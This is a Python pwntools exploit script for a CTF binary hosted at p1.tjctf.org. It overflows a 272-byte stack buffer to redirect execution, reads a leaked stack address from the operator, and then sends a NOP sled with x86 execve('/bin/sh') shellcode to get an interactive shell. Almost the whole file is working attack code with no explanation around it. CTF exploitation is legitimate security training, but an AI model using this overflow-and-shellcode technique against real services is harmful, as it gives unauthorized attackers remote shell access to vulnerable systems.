#!/usr/bin/python

from pwn import *


#p = process("./service")

p = remote("p1.tjctf.org", 8006)

get_tree = 0x08048612

#system = 0xf7e195f0

offset = 272

#I don't have the tree -9268 :(


print p.recvuntil("Enter a tree type: ")

payload = "M"*(offset) + p32(get_tree)

p.sendline(payload)

print p.recvline()
data =  p.recvline()

print data

#stack = int(data.split(" ")[-2].strip(), 16)

#stack = int(tohex(stack, 32), 16)


#print "Stack int ", stack
#print "Stack is at ", hex(stack)

stack_leak = raw_input("Enter the stack value in hex from windows calc xD : ")

stack_leak = int(stack_leak, 16)

print "You have entered ", hex(stack_leak)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = "\x90"*16 + shellcode
payload += "M"*(272 - len(payload))
payload += p32(stack_leak)

p.sendline(payload)

p.interactive()
